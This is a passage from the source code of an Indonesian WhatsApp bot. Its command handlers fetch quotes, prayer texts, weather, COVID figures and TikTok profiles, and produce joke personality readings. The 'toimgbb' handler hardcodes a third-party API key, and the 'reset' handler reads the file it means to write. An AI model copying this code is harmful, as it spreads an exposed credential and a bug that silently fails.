textImg(`*▢ Nama :* ${anu.data.result.name}
*▢ Umur :* ${anu.data.result.age}`)
limitAdd(sender, limit)
}
break
case 'tjadian':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan :
*${prefix}tjadian* tanggal/bulan/tahun

Contoh : ${command} 27/11/2020`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/jadian/${q}?apikey=${lolkey}`)
textImg(`*▢ Karakteristik :* ${anu.data.result.karakteristik}
*▢ Deskripsi :* ${anu.data.result.deskripsi}`)
limitAdd(sender, limit)
}
break
case 'katabijak':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'pantun2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'bucin2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/katabucin?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break

/*case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let ter = command[1].toLowerCase()
let tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break*/

case 'quotesanime':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
let teksnime = `▢ Quotes : ${anu.data.result.quote}
▢ Karakter : ${anu.data.result.character}
▢ Anime : ${anu.data.result.anime}
▢ Episode : ${anu.data.result.episode}`
const buttonsni = [{buttonId: 'quotesanime', buttonText: {displayText: 'NEXT ➡️'}, type: 1}]
const meMessage = {
contentText: teksnime,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttonsni,
headerType: 1
}

surya.sendMessage(from, meMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
limitAdd(sender, limit)
}
break
case 'niatsholat':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/niatsholat/${q}?apikey=${lolkey}`)
textImg(`▢ Nama : ${anu.data.result.name}
▢ Arab : ${anu.data.result.ar}
▢ Latin : ${anu.data.result.latin}
▢ Artinya : ${anu.data.result.id}`)
limitAdd(sender, limit)
}
break
case 'countdown': case 'hitungmundur': case 'cd':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/countdown/${q}?apikey=${lolkey}`)
textImg(`*▢ Hitung Mundur :*
${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'jtvn': case 'jadwaltvnow':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolkey}`)
textImg(`*▢ ANTV :* ${anu.data.result.antv}

*▢ GTV :* ${anu.data.result.gtv}

*▢ INDOSIAR :* ${anu.data.result.indosiar}

*▢ INEWSTV :* ${anu.data.result.inewstv}

*▢ KOMPAS TV :* ${anu.data.result.kompastv}

*▢ METROTV :* ${anu.data.result.metrotv}

*▢ MNCTV :* ${anu.data.result.mnctv}

*▢ NET TV :* ${anu.data.result.nettv}

*▢ RCTI :* ${anu.data.result.rcti}

*▢ RTV :* ${anu.data.result.rtv}

*▢ SCTV :* ${anu.data.result.sctv}

*▢ TRANS7 :* ${anu.data.result.trans7}

*▢ TRANSTV :* ${anu.data.result.transtv}

*▢ TVONE :* ${anu.data.result.tvone}

*▢ TVRI :* ${anu.data.result.tvri}`)
gameAdd(sender, glimit)
}
break
case 'infogempa':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
sendFileFromUrl(from, anu.data.result.map, monospace(`▢ WAKTU : ${anu.data.result.waktu}

▢ MAGNITUDE : ${anu.data.result.magnitude}
▢ KEDALAMAN : ${anu.data.result.kedalaman}
▢ KOORDINAT : ${anu.data.result.koordinat}
▢ LOKASI : ${anu.data.result.lokasi}
▢ POTENSI : ${anu.data.result.potensi}`), msg)
gameAdd(sender, glimit)
}
break
case 'apikeycek': case 'lolcek':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
let anu = await axios.get(`https://api.lolhuman.xyz/api/checkapikey?apikey=${lolkey}`)
textImg(`▢ Username : ${anu.data.result.username}
▢ Request : ${anu.data.result.requests}
▢ Request today : ${anu.data.result.today}
▢ Tipe akun : ${anu.data.result.account_type}
▢ Expired : ${anu.data.result.expired} `)
limitAdd(sender, limit)
}
break
case 'cuaca':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${q}?apikey=${lolkey}`)
textImg(`*DATA BERHASIL DIDAPATKAN*

▢ Tempat : ${anu.data.result.tempat}
▢ Latitude : ${anu.data.result.latitude}
▢ Longitude : ${anu.data.result.longitude}
▢ Cuaca : ${anu.data.result.cuaca}
▢ Angin : ${anu.data.result.angin}
▢ Deskripsi : ${anu.data.result.description}
▢ Kelembapan : ${anu.data.result.kelembapan}
▢ Suhu : ${anu.data.result.suhu}
▢ Permukaan laut : ${anu.data.result.permukaan_laut}`)
gameAdd(sender, glimit)
}
break
case 'covidindo':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
textImg(`*DATA COVID DI INDONESIA*

▢ Positif : ${anu.data.result.positif}
▢ Sembuh : ${anu.data.result.sembuh}
▢ Dirawat : ${anu.data.result.dirawat}
▢ Meninggal : ${anu.data.result.meninggal}`)
limitAdd(sender, limit)
}
break
case 'covidglobal':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
textImg(`*DATA COVID GLOBAL*

▢ Positif : ${anu.data.result.positif}
▢ Sembuh : ${anu.data.result.sembuh}
▢ Dirawat : ${anu.data.result.dirawat}
▢ Meninggal : ${anu.data.result.meninggal}`)
limitAdd(sender, limit)
}
break
case 'kisahnabi':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/kisahnabi/${q}?apikey=${lolkey}`)
textImg(`*▢ Nama nabi :* ${anu.data.result.name}
*▢ Umur :* ${anu.data.result.age}
*▢ Tahun kelahiran :* ${anu.data.result.thn_kelahiran}
*▢ Tempat :* ${anu.data.result.place}

*▢ Cerita :* ${anu.data.result.story}`)
limitAdd(sender, limit)
}
break
case 'nabi':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api-suryabot.herokuapp.com/api/kisahnabi?nabi=${q}&apikey=Suryabot`)
textImg(`*▢ Nama nabi :* ${anu.data.result.nabi.nabi}
*▢ Umur :* ${anu.data.result.nabi.umur}
*▢ Tahun kelahiran :* ${anu.data.result.nabi.lahir}
*▢ Tempat :* ${anu.data.result.nabi.tempat}

*▢ Cerita :* ${anu.data.result.nabi.kisah}`)
limitAdd(sender, limit)
}
break

case 'listkota':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/sholat/kota?apikey=${lolkey}`)
textImg(`▢ Id : ${anu.data.result.id}
▢ Lokasi : ${anu.data.result.lokasi}

`)
limitAdd(sender, limit)
}
break
case 'asmaulhusna': case 'asna': case 'asmaallah':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
textImg(`*▢ Asma Ke :* ${anu.data.result.index}
*▢ Latin :* ${anu.data.result.latin}
*▢ Arab :* ${anu.data.result.ar}
*▢ Indonesia :* ${anu.data.result.id}
*▢ Inggris :* ${anu.data.result.en}`)
limitAdd(sender, limit)
}
break
case 'surah':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
let anu = await axios.get(`https://api.lolhuman.xyz/api/quran/${q}?apikey=${lolkey}`)
textImg(`▢ Nomor : ${anu.data.result.nomor}
▢ Asma : ${anu.data.result.asma}
▢ Surah : ${anu.data.result.surah}
▢ Jumlah ayat : ${anu.data.result.jumlah_ayat}
▢ Type : ${anu.data.result.type}
▢ Keterangan : ${anu.data.result.keterangan}
*▢ Ayat :* ${anu.data.result.ayat.ayat}
*▢ Arab :* ${anu.data.result.ayat.arab}
*▢ Indonesia :* ${anu.data.result.ayat.indonesia}
*▢ Latin :* ${anu.data.result.ayat.latin}`)
limitAdd(sender, limit)
}
break
case 'storyheroml':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.xteam.xyz/search/heroml?q=${q}&APIKEY=${xteam}`)
textImg(`*▢ Cerita Hero ${q} :* ${anu.data.result.background_story}`)
limitAdd(sender, limit)
}
break
case 'tafsirmimpi':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.xteam.xyz/primbon/tafsirmimpi?q=${q}&APIKEY=${xteam}`)
textImg(`*▢ Tafsir Mimpi ${q} :*
${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'heroml':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
let anu = await axios.get(`https://api.lolhuman.xyz/api/heroml/${q}?apikey=${lolkey}`)
sendFileFromUrl(from, anu.data.result.icon, monospace(`Data Berhasil Didapatkan!
▢ Nama hero : ${anu.data.result.hero_name}
▢ Quotes hero : ${anu.data.result.ent_quotes}

Detail Hero
▢ Role : ${anu.data.result.detail.role}
▢ Specialty : ${anu.data.result.detail.specialty}
▢ Lane rekomendasi : ${anu.data.result.detail.laning_recommendation}
▢ Tahun release : ${anu.data.result.detail.release_date}
▢ Movement speed : ${anu.data.result.attr.movement_speed}
▢ Physical attack : ${anu.data.result.attr.physical_attack}
▢ Magic power : ${anu.data.result.attr.magic_power}
▢ Attack speed : ${anu.data.result.attr.attack_speed}
▢ Physical defense : ${anu.data.result.attr.physical_defense}
▢ Basic attack : ${anu.data.result.attr.basic_atk_crit_rate}
▢ Hp : ${anu.data.result.attr.hp}
▢ Mana : ${anu.data.result.attr.mana}
▢ Ability : ${anu.data.result.attr.ability_crit_rate}
▢ Hp regen : ${anu.data.result.attr.hp_regen}
▢ Mana regen : ${anu.data.result.attr.mana_regen}`), msg)
gameAdd(sender, glimit)
}
break
case 'tiktokstalk': case 'ttstalk':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${q}?apikey=${lolkey}`)
sendFileFromUrl(from, anu.data.result.user_picture, monospace(`▢ Username : ${anu.data.result.username}
▢ Nickname : ${anu.data.result.nickname}
▢ Bio : ${anu.data.result.bio}
▢ Followers : ${anu.data.result.followers}
▢ Followings : ${anu.data.result.followings}
▢ Likes : ${anu.data.result.likes}
▢ Video : ${anu.data.result.video}`), msg)
limitAdd(sender, limit)
}
break

case 'anime':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
if (isGame(sender, isOwner, limitCount, limit)) return textImg(`Maaf limit kamu sudah habis`)
Flink(mess.wait)
fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)]
imageToBase64(pjr)
.then((response) => {
let medin = Buffer.from(response, 'base64')
surya.sendMessage(from, medin, image, {quoted:msg, caption:'NIH'})
gameAdd(sender, limit)
}
)
.catch((error) => {
console.log(error); 
}
)
})
break

case 'downloadimg': case 'imagedownload': case 'imgdl': case 'imagedl':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return textImg(`Linknya mana kak ?`)
Flink(mess.wait)
surya.sendMessage(from, await getBuffer(q), image, {contextInfo: { forwardingScore: 100, isForwarded: false, mentionedJid: [sender]},quoted: msg, caption: `Nih ${pushname}`})
limitAdd(sender, limit)
break
case 'teks': case 'text':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return textImg(`Teksnya mana kak ?`)
Flink(mess.wait)
surya.sendMessage(from, await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${q}`), image, {contextInfo: { forwardingScore: 100, isForwarded: false, mentionedJid: [sender]},quoted: msg, caption: `Nih ${pushname}`})
limitAdd(sender, limit)
break

case 'toimgbb':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(mess.wait)
var imgbb = require('imgbb-uploader')
if (isImage || isQuotedImage) {
let ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let owgi = await surya.downloadAndSaveMediaMessage(ger)
let anu = await imgbb("9e30873557f06f55ddbb42f758173c79", owgi)
let teks = `${anu.display_url}`
textImg(`${teks}`)
limitAdd(sender, limit)
} else {
textImg(`Kirim gambar dengan *caption ${prefix}${command}* atau tag gambar yang sudah dikirim`)
}
break

case 'spatrick':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
let get1s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get1s, sticker, {quoted:msg})
let get2s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get2s, sticker, {quoted:msg})
let get3s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get3s, sticker, {quoted:msg})
let get4s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get4s, sticker, {quoted:msg})
let get5s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get5s, sticker, {quoted:msg})
let get6s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get6s, sticker, {quoted:msg})
let get7s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get7s, sticker, {quoted:msg})
let get8s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get8s, sticker, {quoted:msg})
let get9s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get9s, sticker, {quoted:msg})
let get10s = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`)
surya.sendMessage(from, get10s, sticker, {quoted:msg})
limitAdd(sender, limit)
break

case 'sbucin':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
let get1 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get1, sticker, {quoted:msg})
let get2 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get2, sticker, {quoted:msg})
let get3 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get3, sticker, {quoted:msg})
let get4 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get4, sticker, {quoted:msg})
let get5 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get5, sticker, {quoted:msg})
let get6 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get6, sticker, {quoted:msg})
let get7 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get7, sticker, {quoted:msg})
let get8 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get8, sticker, {quoted:msg})
let get9 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get9, sticker, {quoted:msg})
let get10 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${lolkey}`)
surya.sendMessage(from, get10, sticker, {quoted:msg})
limitAdd(sender, limit)
break

case 'cekmati':
if (!q) return reply(`Namanya siapa?`)
let maticek = ['25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130']
const mati = maticek[Math.floor(Math.random() * maticek.length)]
reply(`*Nama :* ${q}
*Mati Pada Umur :* ${mati} Tahun.

_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`, {contextInfo: {"mentionedJid": [sender]}})
break
case 'addupdate':
 if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
 if (!q) return reply(`Example: ${command} update fitur`)
_update.push(q)
 fs.writeFileSync('./database/update.json', JSON.stringify(_update))
 reply(`Update fitur berhasil ditambahkan ke database!`)
 break
 case 'update':
 let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
 for (let i of _update) {
 updateList += `࿃ *${i.replace(_update)}*\n\n`
}
 textImg(updateList)
 break
 case 'reset':
 if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
 var reset = []
 _update = reset
 console.log('Saat mengatur ulang')
 fs.readFileSync('./database/update.json', JSON.stringify(_update))
 textImg(mess.success)
 break
case 'cekwatak':
var namao = pushname
var prfx = await surya.getProfilePicture(sender)
const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
const wtk = watak[Math.floor(Math.random() * (watak.length))]
const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
const sft = sifat[Math.floor(Math.random() * (sifat.length))]
const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkyy','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const hby = hobby[Math.floor(Math.random() * (hobby.length))]
const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
const typo = tipe[Math.floor(Math.random() * (tipe.length))]
reply(`*〔 INTROGASI SUKSES 〕*

*Nama :* ${namao}
*Watak :* ${wtk}
*Akhlak✨ :* ${akhlak}
*Sifat :* ${sft}
*Hobby :* ${hby}
*Tipe :* ${typo}
*Kelebihan :* ${klbh}

*Note :* _ini hanya main main_`)
break

case 'getq':
textImg(JSON.stringify(msg.message.extendedTextMessage.contextInfo, null, 3))
break

case 'tulis':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
 if (args.length < 1) return reply('Yang mau di tulis apaan?')
 let tul = q
